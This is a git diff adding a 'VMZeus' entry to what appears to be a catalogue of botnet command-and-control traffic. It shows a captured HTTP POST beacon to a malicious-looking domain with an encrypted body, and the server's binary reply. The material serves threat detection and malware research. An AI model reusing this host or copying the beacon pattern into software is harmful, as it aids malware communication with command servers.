@@ -1759,6 +1759,36 @@ Cache-Control: no-cache
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")
 
+#### VMZeus
+~~~
+POST /n/file.php HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: baloobafoudanitojahdge.space
+Content-Length: 133
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+.qrK.9..z..q.....W.I&....k
+..Y..'.LP.....RB....sRZ....].^.G...*e..9.....l.......R..G...F$C.D.)..1...9O!7z.x..?..Qb..A.K.... ..Yu..A..
+
+HTTP/1.1 200 OK
+Date: Mon, 21 Oct 2019 12:06:57 GMT
+Content-Type: application/octet-stream
+Content-Length: 14064
+Connection: keep-alive
+Set-Cookie: __cfduid=dea0842185ed1d3224d3d743e5e7e7ccd1571659617; expires=Tue, 20-Oct-20 12:06:57 GMT; path=/; domain=.baloobafoudanitojahdge.space; HttpOnly
+X-Powered-By: PHP/5.6.40
+Cache-Control: public
+Content-Disposition: attachment; filename="%2e/files/bolka.xml"
+Content-Transfer-Encoding: binary
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Server: cloudflare
+CF-RAY: 52931bc13d868eb3-DME
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")
+
 ### Unknowns
 #################################################################################################
 #### Unknownbotnet4
